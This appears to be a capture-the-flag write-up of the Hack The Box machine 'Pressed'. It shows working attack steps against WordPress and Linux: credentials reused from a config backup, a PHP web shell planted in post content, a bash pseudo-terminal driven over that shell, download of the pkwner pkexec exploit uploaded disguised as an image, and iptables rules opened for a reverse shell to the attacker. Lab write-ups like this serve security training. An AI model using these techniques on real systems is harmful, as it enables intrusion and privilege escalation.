---
title: "HTB - Pressed"
date: 2025-07-26
author: "ChaosSec"
tags: ["HTB", "WordPress", "XML-RPC", "Linux", "Privilege Escalation"]
summary: ""
---

## 🔍 Port Scanning

```bash
sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.11.142 -oG allPorts
sudo nmap -sCV -p80 10.10.11.142 -oN targeted
```

```bash
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

## 🌐 Web Enumeration

- The WordPress site appears at `http://pressed.htb`
- Visiting `/wp-login.php` hints at needing the hostname `pressed.htb`, so we add it to `/etc/hosts`.
- `whatweb` and `nmap --script http-enum` confirm WordPress 5.9 and show several routes.

## 🔍 Credentials from Backup

A backup file was found:

```bash
curl -s http://pressed.htb/wp-config.php.bak
```

Inside were credentials:
```
admin:uhc-jan-finals-2021
```

Since the site mentions 2022, we try `uhc-jan-finals-2022`, which works.  
However, login requires an OTP token.

## 🧠 XML-RPC Exploitation

The `xmlrpc.php` endpoint is active. Listing available methods:

```bash
curl -s -X POST http://pressed.htb/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
```

One of the available methods is:

```bash
htb.get_flag
```

Used:

```bash
curl --data '<methodCall><methodName>htb.get_flag</methodName><params></params></methodCall>' http://pressed.htb/xmlrpc.php
```

## 🧬 Code Injection via WordPress Post Content

Logged in as admin using XML-RPC in Python:

```python
from wordpress_xmlrpc import Client
from wordpress_xmlrpc.methods import posts
import collections
collections.Iterable = collections.abc.Iterable

client = Client('http://pressed.htb/xmlrpc.php', 'admin', 'uhc-jan-finals-2022')
plist = client.call(posts.GetPosts())
```

Decoded the base64 block in `plist[0].content` and discovered a PHP snippet executing a local file.  
Replaced it with:

```php
<?php system($_GET['cmd']); ?>
```

This allowed remote command execution via:

```
http://pressed.htb/index.php/2022/01/28/hello-world/?cmd=whoami
```

## ❌ Reverse Shell Blocked by iptables

Reverse shell attempts failed due to firewall restrictions.

### Created a fake terminal using Bash:

```bash
#!/bin/bash
function ctrl_c(){ echo -e "\n\n[!] Exiting...\n"; }
trap ctrl_c INT
main_url="http://pressed.htb/index.php/2022/01/28/hello-world/?cmd="
while [ "$command" != "exit" ]; do
  echo -n "$~ " && read -r  command
  command="$(echo "$command 2>%261" | tr ' ' '+')"
  curl -s -X GET "$main_url$command" | grep "<p>" -A100 | grep "</p>" -B100 | sed 's/p<p>//' | sed 's/p<\/p>//'
done
```

## ⬆️ Privilege Escalation via pkexec

Confirmed `pkexec` is SUID:

```bash
which pkexec | xargs ls -l
```

Downloaded an exploit:

```bash
wget https://raw.githubusercontent.com/kimusan/pkwner/main/pkwner.sh
```

Uploaded via XML-RPC media upload:

```python
from wordpress_xmlrpc.methods import media
with open('pkwner.sh', 'r') as f:
    script = f.read()
data = {'name': 'pkwner.png', 'bits': script, 'type': 'text/plain'}
client.call(media.UploadFile(data))
```

Executed via web path:

```bash
bash /var/www/html/wp-content/uploads/2023/06/pkwner.png
```

Modified firewall to allow reverse shell:

```bash
iptables -A OUTPUT -p tcp -d 10.10.14.14 -j ACCEPT
iptables -A INPUT -p tcp -s 10.10.14.14 -j ACCEPT
```

🎯 **Root access achieved.**
